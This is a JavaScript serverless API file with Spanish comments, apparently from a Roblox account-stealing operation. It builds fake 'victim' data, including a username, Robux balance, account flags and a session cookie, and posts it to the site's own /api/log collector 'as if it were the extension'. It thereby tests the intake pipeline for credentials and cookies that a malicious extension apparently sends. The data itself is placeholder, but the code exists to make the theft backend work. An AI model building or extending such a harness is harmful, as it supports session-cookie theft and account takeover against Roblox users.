// api/simular-victima.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Datos de prueba como si fueran de una víctima
    const datosPrueba = {
        roblox: {
            username: "Usuario_Test",
            userId: "123456789",
            robux: 1500,
            seguidores: 800,
            amigos: 200,
            premium: "Sí",
            verified: "Sí",
            headless: "Sí",
            korblox: "No"
        },
        cookie: "COOKIE_DE_PRUEBA_123456",
        pais: "Argentina",
        fecha: "10/03/2026",
        hora: "15:30:22 De la Tarde",
        userAgent: "Mozilla/5.0 (Test)"
    };

    // Enviar a log.js como si fuera la extensión
    const baseUrl = `https://${req.headers.host}`;
    
    try {
        const response = await fetch(`${baseUrl}/api/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(datosPrueba)
        });

        const resultado = await response.json();
        
        res.status(200).json({
            mensaje: "✅ Simulación enviada a /api/log",
            respuesta_log: resultado,
            datos_enviados: datosPrueba
        });
        
    } catch (error) {
        res.status(500).json({
            error: error.message,
            mensaje: "❌ Falló al enviar a /api/log"
        });
    }
}